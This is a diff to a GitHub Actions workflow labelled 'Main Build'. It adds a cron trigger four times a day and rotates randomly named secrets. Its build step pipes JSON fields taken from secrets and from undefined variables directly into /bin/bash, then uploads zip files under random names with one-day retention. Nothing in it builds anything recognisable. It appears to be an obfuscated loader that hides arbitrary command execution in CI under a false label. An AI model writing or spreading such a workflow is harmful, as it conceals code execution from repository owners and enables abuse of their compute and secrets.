@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,20 +17,17 @@ jobs:
         uses: actions/checkout@v4
       - name: Build
         env:
-          f3494: ${{ secrets.f3494 }}
+          rre90: ${{ secrets.rre90 }}
         run: |
-          printf '%s' "$f3494" | jq -r .lt1 | /bin/bash
-          printf '%s' "$zcj32" | jq -r .b12 | /bin/bash
-          echo $ba4 | jq -r .szj69 | /bin/bash
-          printf '%s' "$m481" | jq -r .jn54578 | /bin/bash
-          echo $iae82552 | jq -r .zjxoq549 | /bin/bash
-          echo $cnj3367 | jq -r .kwqc03576 | /bin/bash
-          echo $jsl2999 | jq -r .mg45090 | /bin/bash
+          printf '%s' "$rre90" | jq -r .hy755 | /bin/bash
+          printf '%s' "$pzh54165" | jq -r .heyb23673 | /bin/bash
+          echo $b39671 | jq -r .sy34 | /bin/bash
+          printf '%s' "$gd2939" | jq -r .gfa392 | /bin/bash
 
       - name: Archive output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: UY3qpLlm
+          name: hlbt1VzW
           path: "*.zip"
           retention-days: 1
